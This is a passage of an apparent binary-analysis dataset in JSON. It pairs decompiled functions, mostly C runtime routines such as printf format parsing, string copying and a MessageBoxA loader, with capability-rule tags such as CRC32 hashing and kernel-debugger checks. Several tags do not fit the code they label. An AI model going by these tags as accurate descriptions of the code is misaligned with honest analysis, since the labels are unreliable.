if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0040d97d(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0040d97d(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.0040d97d(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80000) != 0) {\n            var_8h = 0x1000;\n            uVar2 = fcn.0040d97d(&var_ch, 0x80000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 1877
    },
    "00418ce1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00418ce1(int32_t arg_8h, uint8_t *arg_ch, uint arg_10h, int32_t **arg_14h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint64_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint8_t *puVar10;\n    char *pcVar11;\n    int32_t *piVar12;\n    bool bVar13;\n    int64_t iVar14;\n    uint *puVar15;\n    int32_t *piVar16;\n    uint uVar17;\n    int32_t *var_278h;\n    int32_t *var_274h;\n    uint var_270h;\n    int32_t var_26ch;\n    int32_t var_268h;\n    char *var_260h;\n    uint var_25ch;\n    int32_t var_254h;\n    uint var_250h;\n    int32_t var_24ch;\n    int32_t var_248h;\n    int32_t *var_244h;\n    int32_t var_240h;\n    uint8_t *var_23ch;\n    int32_t var_238h;\n    int32_t *var_234h;\n    int32_t var_230h;\n    uint var_22ch;\n    int32_t var_228h;\n    int32_t **var_224h;\n    char *var_220h;\n    int32_t *var_21ch;\n    int32_t *var_218h;\n    uint8_t var_211h;\n    uint32_t var_210h;\n    uint var_20ch;\n    uchar var_dh;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    var_24ch = arg_8h;\n    var_224h = arg_14h;\n    var_248h = 0;\n    var_210h = 0;\n    var_234h = NULL;\n    var_218h = NULL;\n    var_230h = 0;\n    var_240h = 0;\n    var_238h = 0;\n    fcn.0041102a(arg_10h);\n    if (arg_8h != 0) {\n        if ((*(arg_8h + 0xc) & 0x40) == 0) {\n            uVar5 = fcn.0041a799(arg_8h);\n            if ((uVar5 == 0xffffffff) || (uVar5 == 0xfffffffe)) {\n                iVar9 = 0x4367d8;\n            }\n            else {\n                iVar9 = (uVar5 & 0x1f) * 0x40 + *((uVar5 >> 5) * 4 + 0x439de0);\n            }\n            if ((*(iVar9 + 0x24) & 0x7f) == 0) {\n                if ((uVar5 == 0xffffffff) || (uVar5 == 0xfffffffe)) {\n                    iVar9 = 0x4367d8;\n                }\n                else {\n                    iVar9 = (uVar5 & 0x1f) * 0x40 + *((uVar5 >> 5) * 4 + 0x439de0);\n                }\n                if ((*(iVar9 + 0x24) & 0x80) == 0) goto code_r0x00418de5;\n            }\n        }\n        else {\ncode_r0x00418de5:\n            if (arg_ch != NULL) {\n                var_211h = *arg_ch;\n                var_228h = 0;\n                var_220h = NULL;\n                var_244h = NULL;\n                iVar9 = 0;\n                while ((var_211h != 0 && (puVar10 = arg_ch + 1,  var_23ch = puVar10,  -1 < var_228h))) {\n                    if (var_211h - 0x20 < 0x59) {\n                        uVar5 = *(var_211h + 0x42e5a0) & 0xf;\n                    }\n                    else {\n                        uVar5 = 0;\n                    }\n                    var_26ch = *(iVar9 + 0x42e5c0 + uVar5 * 8) >> 4;\n    // switch table (8 cases) at 0x419859\n                    switch(var_26ch) {\n                    case 0:\ncode_r0x00419064:\n                        var_238h = 0;\n                        iVar9 = fcn.00421f89(var_211h, &var_25ch);\n                        if (iVar9 != 0) {\n                            fcn.00419879();\n                            var_23ch = arg_ch + 2;\n                            if (*puVar10 == 0) goto code_r0x00418d4c;\n                        }\n                        fcn.00419879();\n                        break;\n                    case 1:\n                        var_218h = 0xffffffff;\n                        var_270h = 0;\n                        var_240h = 0;\n                        var_234h = NULL;\n                        var_230h = 0;\n                        var_210h = 0;\n                        var_238h = 0;\n                        break;\n                    case 2:\n                        if (var_211h == 0x20) {\n                            var_210h = var_210h | 2;\n                        }\n                        else if (var_211h == 0x23) {\n                            var_210h = var_210h | 0x80;\n                        }\n                        else if (var_211h == 0x2b) {\n                            var_210h = var_210h | 1;\n                        }\n                        else if (var_211h == 0x2d) {\n                            var_210h = var_210h | 4;\n                        }\n                        else if (var_211h == 0x30) {\n                            var_210h = var_210h | 8;\n                        }\n                        break;\n                    case 3:\n                        if (var_211h == 0x2a) {\n                            var_224h = arg_14h + 1;\n                            var_234h = *arg_14h;\n                            if (var_234h < 0) {\n                                var_210h = var_210h | 4;\n                                var_234h = -var_234h;\n                            }\n                        }\n                        else {\n                            var_234h = var_234h * 10 + -0x30 + var_211h;\n                        }\n                        break;\n                    case 4:\n                        var_218h = NULL;\n                        break;\n                    case 5:\n                        if (var_211h == 0x2a) {\n                            var_224h = arg_14h + 1;\n                            var_218h = *arg_14h;\n                            if (var_218h < 0) {\n                                var_218h = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_218h = var_218h * 10 + -0x30 + var_211h;\n                        }\n                        break;\n                    case 6:\n                        if (var_211h == 0x49) {\n                            uVar1 = *puVar10;\n                            if ((uVar1 == 0x36) && (arg_ch[2] == 0x34)) {\n                                var_210h = var_210h | 0x8000;\n                                var_23ch = arg_ch + 3;\n                            }\n                            else if ((uVar1 == 0x33) && (arg_ch[2] == 0x32)) {\n                                var_210h = var_210h & 0xffff7fff;\n                                var_23ch = arg_ch + 3;\n                            }\n                            else if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                                     ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                                var_26ch = 0;\n                                goto code_r0x00419064;\n                            }\n                        }\n                        else if (var_211h == 0x68) {\n                            var_210h = var_210h | 0x20;\n                        }\n                        else if (var_211h == 0x6c) {\n                            if (*puVar10 == 0x6c) {\n                                var_210h = var_210h | 0x1000;\n                                var_23ch = arg_ch + 2;\n                            }\n                            else {\n                                var_210h = var_210h | 0x10;\n                            }\n                        }\n                        else if (var_211h == 0x77) {\n                            var_210h = var_210h | 0x800;\n                        }\n                        break;\n                    case 7:\n                        if (var_211h < 'e') {\n                            if (var_211h == 100) {\ncode_r0x00419349:\n                                var_210h = var_210h | 0x40;\ncode_r0x00419350:\n                                var_220h = 0xa;\ncode_r0x0041935a:\n                                if (((var_210h & 0x8000) == 0) && ((var_210h & 0x1000) == 0)) {\n                                    var_224h = arg_14h + 1;\n                                    if ((var_210h & 0x20) == 0) {\n                                        piVar12 = *arg_14h;\n                                        if ((var_210h & 0x40) == 0) {\n                                            piVar7 = NULL;\n                                        }\n                                        else {\n                                            piVar7 = piVar12 >> 0x1f;\n                                        }\n                                    }\n                                    else {\n                                        if ((var_210h & 0x40) == 0) {\n                                            piVar12 = *arg_14h;\n                                        }\n                                        else {\n                                            piVar12 = *arg_14h;\n                                        }\n                                        piVar7 = piVar12 >> 0x1f;\n                                    }\n                                }\n                                else {\n                                    piVar12 = *arg_14h;\n                                    piVar7 = arg_14h[1];\n                                    var_224h = arg_14h + 2;\n                                }\n                                if ((((var_210h & 0x40) != 0) && (piVar7 < 1)) && (piVar7 < 0)) {\n                                    bVar13 = piVar12 != NULL;\n                                    piVar12 = -piVar12;\n                                    piVar7 = -(piVar7 + bVar13);\n                                    var_210h = var_210h | 0x100;\n                                }\n                                if ((var_210h & 0x9000) == 0) {\n                                    piVar7 = NULL;\n                                }\n                                iVar14 = CONCAT44(piVar7, piVar12);\n                                if (var_218h < 0) {\n                                    var_218h = 0x1;\n                                }\n                                else {\n                                    var_210h = var_210h & 0xfffffff7;\n                                    if (0x200 < var_218h) {\n                                        var_218h = 0x200;\n                                    }\n                                }\n                                if ((piVar12 | piVar7) == 0) {\n                                    var_230h = 0;\n                                }\n                                piVar12 = &var_dh;\n                                while( true ) {\n                                    uVar3 = iVar14 >> 0x20;\n                                    piVar7 = var_218h + -1;\n                                    if ((var_218h < 1) && (iVar14 == 0)) break;\n                                    var_218h = piVar7;\n                                    iVar14 = fcn.0041de30();\n                                    iVar9 = extraout_ECX + 0x30;\n                                    if (0x39 < iVar9) {\n                                        iVar9 = iVar9 + var_248h;\n                                    }\n                                    *piVar12 = iVar9;\n                                    piVar12 = piVar12 + -1;\n                                    var_260h = uVar3;\n                                }\n                                var_220h = &var_dh + -piVar12;\n                                var_21ch = piVar12 + 1;\n                                var_218h = piVar7;\n                                if (((var_210h & 0x200) != 0) && ((var_220h == NULL || (*var_21ch != '0')))) {\n                                    *piVar12 = '0';\n                                    var_220h = &var_ch + -piVar12;\n                                    var_21ch = piVar12;\n                                }\n                            }\n                            else if (var_211h < 'T') {\n                                if (var_211h == 0x53) {\n                                    if ((var_210h & 0x830) == 0) {\n                                        var_210h = var_210h | 0x800;\n                                    }\n                                    goto code_r0x00419175;\n                                }\n                                if (var_211h == 0x41) {\ncode_r0x004190f4:\n                                    var_211h = var_211h + 0x20;\n                                    var_270h = 1;\ncode_r0x00419107:\n                                    var_210h = var_210h | 0x40;\n                                    var_260h = 0x200;\n                                    piVar7 = &var_20ch;\n                                    pcVar11 = var_260h;\n                                    piVar12 = &var_20ch;\n                                    if (var_218h < 0) {\n                                        var_218h = 0x6;\n                                    }\n                                    else if (var_218h == NULL) {\n                                        if (var_211h == 0x67) {\n                                            var_218h = 0x1;\n                                        }\n                                    }\n                                    else {\n                                        if (0x200 < var_218h) {\n                                            var_218h = 0x200;\n                                        }\n                                        if (0xa3 < var_218h) {\n                                            pcVar11 = var_218h + 0x15d;\n                                            var_21ch = &var_20ch;\n                                            var_244h = fcn.0041c21c(pcVar11);\n                                            piVar7 = var_244h;\n                                            piVar12 = var_244h;\n                                            if (var_244h == NULL) {\n                                                var_218h = 0xa3;\n                                                piVar7 = &var_20ch;\n                                                pcVar11 = var_260h;\n                                                piVar12 = var_21ch;\n                                            }\n                                        }\n                                    }\n                                    var_21ch = piVar12;\n                                    var_260h = pcVar11;\n                                    var_278h = *arg_14h;\n                                    var_224h = arg_14h + 2;\n                                    var_274h = arg_14h[1];\n                                    puVar4 = &var_25ch;\n                                    iVar9 = var_211h;\n                                    puVar15 = &var_278h;\n                                    piVar12 = piVar7;\n                                    pcVar11 = var_260h;\n                                    piVar16 = var_218h;\n                                    uVar17 = var_270h;\n                                    pcVar6 = fcn.0041865b(*0x436988);\n                                    (*pcVar6)(puVar15, piVar12, pcVar11, iVar9, piVar16, uVar17, puVar4);\n                                    uVar5 = var_210h & 0x80;\n                                    if ((uVar5 != 0) && (var_218h == NULL)) {\n                                        puVar4 = &var_25ch;\n                                        piVar12 = piVar7;\n                                        pcVar6 = fcn.0041865b(*0x436994);\n                                        (*pcVar6)(piVar12, puVar4);\n                                    }\n                                    if ((var_211h == 0x67) && (uVar5 == 0)) {\n                                        puVar4 = &var_25ch;\n                                        piVar12 = piVar7;\n                                        pcVar6 = fcn.0041865b(*0x436990);\n                                        (*pcVar6)(piVar12, puVar4);\n                                    }\n                                    if (*piVar7 == '-') {\n                                        var_210h = var_210h | 0x100;\n                                        var_21ch = piVar7 + 1;\n                                        piVar7 = var_21ch;\n                                    }\ncode_r0x004192a7:\n                                    var_220h = fcn.004121f0(piVar7);\n                                }\n                                else if (var_211h == 0x43) {\n                                    if ((var_210h & 0x830) == 0) {\n                                        var_210h = var_210h | 0x800;\n                                    }\ncode_r0x004191e8:\n                                    var_224h = arg_14h + 1;\n                                    if ((var_210h & 0x810) == 0) {\n                                        var_20ch._0_1_ = *arg_14h;\n                                        var_220h = 0x1;\n                                    }\n                                    else {\n                                        iVar9 = fcn.00421f6c(&var_220h, &var_20ch, 0x200, *arg_14h);\n                                        if (iVar9 != 0) {\n                                            var_240h = 1;\n                                        }\n                                    }\n                                    var_21ch = &var_20ch;\n                                }\n                                else if ((var_211h == 0x45) || (var_211h == 0x47)) goto code_r0x004190f4;\n                            }\n                            else {\n                                if (var_211h == 0x58) goto code_r0x004194ae;\n                                if (var_211h == 0x5a) {\n                                    piVar12 = *arg_14h;\n                                    var_224h = arg_14h + 1;\n                                    piVar7 = *0x436550;\n                                    var_21ch = *0x436550;\n                                    if ((piVar12 == NULL) || (piVar16 = piVar12[1],  piVar16 == NULL))\n                                    goto code_r0x004192a7;\n                                    var_220h = *piVar12;\n                                    var_21ch = piVar16;\n                                    if ((var_210h & 0x800) == 0) {\n                                        var_238h = 0;\n                                    }\n                                    else {\n                                        var_220h = var_220h / 2;\n                                        var_238h = 1;\n                                    }\n                                }\n                                else {\n                                    if (var_211h == 0x61) goto code_r0x00419107;\n                                    if (var_211h == 99) goto code_r0x004191e8;\n                                }\n                            }\ncode_r0x00419686:\n                            if (var_240h == 0) {\n                                if ((var_210h & 0x40) != 0) {\n                                    if ((var_210h & 0x100) == 0) {\n                                        if ((var_210h & 1) == 0) {\n                                            if ((var_210h & 2) == 0) goto code_r0x004196cf;\n                                            var_22ch._0_1_ = 0x20;\n                                        }\n                                        else {\n                                            var_22ch._0_1_ = 0x2b;\n                                        }\n                                    }\n                                    else {\n                                        var_22ch._0_1_ = 0x2d;\n                                    }\n                                    var_230h = 1;\n                                }\ncode_r0x004196cf:\n                                pcVar11 = var_234h + (-var_230h - var_220h);\n                                if ((var_210h & 0xc) == 0) {\n                                    fcn.004198ac(0x20, pcVar11, var_24ch);\n                                }\n                                iVar9 = var_24ch;\n                                fcn.004198d2(var_230h);\n                                if (((var_210h & 8) != 0) && ((var_210h & 4) == 0)) {\n                                    fcn.004198ac(0x30, pcVar11, iVar9);\n                                }\n                                if ((var_238h == 0) || (var_220h < 1)) {\n                                    fcn.004198d2(var_220h);\n                                }\n                                else {\n                                    var_260h = var_220h;\n                                    piVar12 = var_21ch;\n                                    do {\n                                        uVar2 = *piVar12;\n                                        var_260h = var_260h + -1;\n                                        piVar12 = piVar12 + 2;\n                                        iVar8 = fcn.00421f6c(&var_268h, &var_ch, 6, uVar2);\n                                        if ((iVar8 != 0) || (var_268h == 0)) {\n                                            var_228h = -1;\n                                            break;\n                                        }\n                                        fcn.004198d2(var_268h);\n                                    } while (var_260h != NULL);\n                                }\n                                if ((-1 < var_228h) && ((var_210h & 4) != 0)) {\n                                    fcn.004198ac(0x20, pcVar11, iVar9);\n                                }\n                            }\n                        }\n                        else {\n                            if ('p' < var_211h) {\n                                if (var_211h == 0x73) {\ncode_r0x00419175:\n                                    piVar12 = var_218h;\n                                    if (var_218h == 0xffffffff) {\n                                        piVar12 = 0x7fffffff;\n                                    }\n                                    var_224h = arg_14h + 1;\n                                    var_21ch = *arg_14h;\n                                    if ((var_210h & 0x810) == 0) {\n                                        piVar7 = var_21ch;\n                                        if (var_21ch == NULL) {\n                                            piVar7 = *0x436550;\n                                            var_21ch = *0x436550;\n                                        }\n                                        for (; (piVar12 != NULL && (piVar12 = piVar12 + -1,  *piVar7 != '\\0'));\n                                            piVar7 = piVar7 + 1) {\n                                        }\n                                        var_220h = piVar7 - var_21ch;\n                                    }\n                                    else {\n                                        if (var_21ch == NULL) {\n                                            var_21ch = *0x436554;\n                                        }\n                                        var_238h = 1;\n                                        for (piVar7 = var_21ch;\n                                            (piVar12 != NULL && (piVar12 = piVar12 + -1,  *piVar7 != 0));\n                                            piVar7 = piVar7 + 2) {\n                                        }\n                                        var_220h = piVar7 - var_21ch >> 1;\n                                    }\n                                    goto code_r0x00419686;\n                                }\n                                if (var_211h == 0x75) goto code_r0x00419350;\n                                if (var_211h != 0x78) goto code_r0x00419686;\n                                var_248h = 0x27;\ncode_r0x004194da:\n                                var_220h = 0x10;\n                                if ((var_210h & 0x80) != 0) {\n                                    var_22ch._1_1_ = var_248h + 'Q';\n                                    var_22ch._0_1_ = 0x30;\n                                    var_230h = 2;\n                                }\n                                goto code_r0x0041935a;\n                            }\n                            if (var_211h == 0x70) {\n                                var_218h = 0x8;\ncode_r0x004194ae:\n                                var_248h = 7;\n                                goto code_r0x004194da;\n                            }\n                            if (var_211h < 'e') goto code_r0x00419686;\n                            if (var_211h < 'h') goto code_r0x00419107;\n                            if (var_211h == 0x69) goto code_r0x00419349;\n                            if (var_211h != 0x6e) {\n                                if (var_211h != 0x6f) goto code_r0x00419686;\n                                var_220h = 0x8;\n                                if ((var_210h & 0x80) != 0) {\n                                    var_210h = var_210h | 0x200;\n                                }\n                                goto code_r0x0041935a;\n                            }\n                            piVar12 = *arg_14h;\n                            var_224h = arg_14h + 1;\n                            iVar9 = fcn.00421dea();\n                            if (iVar9 == 0) goto code_r0x00418d4c;\n                            if ((var_210h & 0x20) == 0) {\n                                *piVar12 = var_228h;\n                            }\n                            else {\n                                *piVar12 = var_228h;\n                            }\n                            var_240h = 1;\n                        }\n                        if (var_244h != NULL) {\n                            fcn.00410dee(var_244h);\n                            var_244h = NULL;\n                        }\n                    }\n                    var_211h = *var_23ch;\n                    iVar9 = var_26ch;\n                    arg_ch = var_23ch;\n                    arg_14h = var_224h;\n                }\n                if (var_250h != '\\0') {\n                    *(var_254h + 0x70) = *(var_254h + 0x70) & 0xfffffffd;\n                }\n                goto code_r0x00419849;\n            }\n        }\n    }\ncode_r0x00418d4c:\n    puVar4 = fcn.004125de();\n    *puVar4 = 0x16;\n    fcn.00415a3c(0, 0, 0, 0, 0);\n    if (var_250h != '\\0') {\n        *(var_254h + 0x70) = *(var_254h + 0x70) & 0xfffffffd;\n    }\ncode_r0x00419849:\n    fcn.00410f95(unaff_EBX);\n    return;\n}\n",
        "token_count": 5838
    },
    "0041caa8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041caa8(uint8_t *arg_8h, uint32_t arg_ch, uint8_t *arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint8_t *var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n            goto code_r0x0041cad5;\n        }\n    }\n    else if (arg_8h == NULL) goto code_r0x0041cad5;\n    if (arg_ch == 0) {\ncode_r0x0041cad5:\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    if (arg_14h == 0) {\n        *arg_8h = 0;\n        return 0;\n    }\n    if (arg_10h == NULL) {\n        *arg_8h = 0;\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    fcn.0041102a(arg_18h);\n    if (*(var_10h + 8) == 0) {\n        uVar3 = fcn.00415337(arg_8h, arg_ch, arg_10h, arg_14h);\n        goto code_r0x0041cc96;\n    }\n    puVar4 = arg_8h;\n    uVar7 = arg_ch;\n    if (arg_14h == -1) {\n        do {\n            uVar1 = *arg_10h;\n            *puVar4 = uVar1;\n            puVar4 = puVar4 + 1;\n            arg_10h = arg_10h + 1;\n            if (uVar1 == 0) break;\n            uVar7 = uVar7 - 1;\n        } while (uVar7 != 0);\n    }\n    else {\n        do {\n            puVar5 = puVar4;\n            uVar1 = *arg_10h;\n            *puVar5 = uVar1;\n            puVar4 = puVar5 + 1;\n            arg_10h = arg_10h + 1;\n            if ((uVar1 == 0) || (uVar7 = uVar7 - 1,  uVar7 == 0)) break;\n            arg_14h = arg_14h + -1;\n        } while (arg_14h != 0);\n        if (arg_14h == 0) {\n            *puVar4 = 0;\n            puVar4 = puVar5 + 2;\n        }\n    }\n    if (uVar7 != 0) {\n        if (puVar4 - arg_8h < 2) {\ncode_r0x0041cca4:\n            if (var_8h != '\\0') {\n                *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n            }\n            return 0;\n        }\n        puVar4 = puVar4 + -2;\n        puVar5 = puVar4;\n        while ((arg_8h <= puVar5 && (iVar6 = fcn.00414c7a(*puVar5, &var_14h),  iVar6 != 0))) {\n            puVar5 = puVar5 + -1;\n        }\n        if ((puVar4 - puVar5 & 1U) == 0) goto code_r0x0041cca4;\ncode_r0x0041cc88:\n        *puVar4 = 0;\n        puVar2 = fcn.004125de();\n        uVar3 = 0x2a;\n        *puVar2 = 0x2a;\ncode_r0x0041cc96:\n        if (var_8h != '\\0') {\n            *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n            return uVar3;\n        }\n        return uVar3;\n    }\n    if ((*arg_10h == 0) || (arg_14h == 1)) {\n        puVar4 = puVar4 + -1;\n        var_4h = puVar4;\n        while ((arg_8h <= var_4h && (iVar6 = fcn.00414c7a(*var_4h, &var_14h),  iVar6 != 0))) {\n            var_4h = var_4h + -1;\n        }\n        if ((puVar4 - var_4h & 1U) != 0) goto code_r0x0041cc88;\n    }\n    if (arg_14h != -1) {\n        *arg_8h = 0;\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x22;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        if (var_8h != '\\0') {\n            *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n            return 0x22;\n        }\n        return 0x22;\n    }\n    if (1 < arg_ch) {\n        puVar4 = arg_8h + (arg_ch - 2);\n        puVar5 = puVar4;\n        while ((arg_8h <= puVar5 && (iVar6 = fcn.00414c7a(*puVar5, &var_14h),  iVar6 != 0))) {\n            puVar5 = puVar5 + -1;\n        }\n        if ((puVar4 - puVar5 & 1U) != 0) {\n            *puVar4 = 0;\n            goto code_r0x0041cc11;\n        }\n    }\n    arg_8h[arg_ch - 1] = 0;\ncode_r0x0041cc11:\n    if (var_8h != '\\0') {\n        *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n    }\n    return 0x50;\n}\n",
        "token_count": 1534
    },
    "0041f37d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041f37d(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *unaff_ESI;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00418652();\n    var_4h = 0;\n    if (*0x439b80 == 0) {\n        iVar2 = func_0x006bb2d6(&stack0xfffffffc, \"USER32.DLL\");\n        if (iVar2 == 0) {\n            return 0;\n        }\n        func_0x0053624d(iVar2);\n        arg_8h_00 = (*unaff_ESI)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x439b80 = fcn.004185e0(arg_8h_00);\n        uVar3 = (*unaff_ESI)(iVar2, \"GetActiveWindow\");\n        *0x439b84 = fcn.004185e0(uVar3);\n        uVar3 = (*unaff_ESI)(iVar2, \"GetLastActivePopup\");\n        *0x439b88 = fcn.004185e0(uVar3);\n        uVar3 = (*unaff_ESI)(iVar2, \"GetUserObjectInformationA\");\n        *0x439b90 = fcn.004185e0(uVar3);\n        if (*0x439b90 != 0) {\n            uVar3 = (*unaff_ESI)(iVar2, \"GetProcessWindowStation\");\n            *0x439b8c = fcn.004185e0(uVar3);\n        }\n    }\n    if ((*0x439b8c != iVar1) && (*0x439b90 != iVar1)) {\n        pcVar4 = fcn.0041865b(*0x439b8c);\n        pcVar5 = fcn.0041865b(*0x439b90);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0041f4bf;\n        }\n    }\n    if ((((*0x439b84 != iVar1) && (pcVar4 = fcn.0041865b(*0x439b84),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x439b88 != iVar1 && (pcVar4 = fcn.0041865b(*0x439b88),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0041f4bf:\n    pcVar4 = fcn.0041865b(*0x439b80);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 835
    },
    "00421c61": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00421c61(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x4330e0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004125f1();\n        *puVar2 = 0;\n        puVar2 = fcn.004125de();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x439dc0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x439de0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0042220a(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004125de();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004125f1();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0042152e(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00421d33(0x4330e0);\n                goto code_r0x00421d2d;\n            }\n        }\n        puVar2 = fcn.004125f1();\n        *puVar2 = 0;\n        puVar2 = fcn.004125de();\n        *puVar2 = 9;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n    }\ncode_r0x00421d2d:\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 634
    },
    "004222d1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004222d1(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x433120, 0x18);\n    *(unaff_EBP + -0x1c) = 0xffffffff;\n    iVar5 = 0;\n    *(unaff_EBP + -0x24) = 0;\n    iVar2 = fcn.00415ece(0xb);\n    if (iVar2 != 0) {\n        fcn.00415f91(0xb);\n        *(unaff_EBP + -4) = 0;\n        for (; *(unaff_EBP + -0x28) = iVar5,  iVar5 < 0x40; iVar5 = iVar5 + 1) {\n            uVar4 = *(iVar5 * 4 + 0x439de0);\n            if (uVar4 == 0) {\n                puVar3 = fcn.0041c261(0x20, 0x40);\n                *(unaff_EBP + -0x20) = puVar3;\n                if (puVar3 != NULL) {\n                    piVar1 = iVar5 * 4 + 0x439de0;\n                    *piVar1 = puVar3;\n                    *0x439dc0 = *0x439dc0 + 0x20;\n                    while (puVar3 < *piVar1 + 0x800) {\n                        *(puVar3 + 1) = 0;\n                        *puVar3 = 0xffffffff;\n                        *(puVar3 + 5) = 10;\n                        puVar3[2] = 0;\n                        puVar3 = puVar3 + 0x10;\n                        *(unaff_EBP + -0x20) = puVar3;\n                    }\n                    iVar5 = iVar5 << 5;\n                    *(unaff_EBP + -0x1c) = iVar5;\n                    *(*((iVar5 >> 5) * 4 + 0x439de0) + 4) = 1;\n                    iVar2 = fcn.0042220a(iVar5);\n                    if (iVar2 == 0) {\n                        *(unaff_EBP + -0x1c) = 0xffffffff;\n                    }\n                }\n                break;\n            }\n            for (; *(unaff_EBP + -0x20) = uVar4,  uVar4 < *(iVar5 * 4 + 0x439de0) + 0x800U; uVar4 = uVar4 + 0x40) {\n                if ((*(uVar4 + 4) & 1) == 0) {\n                    if 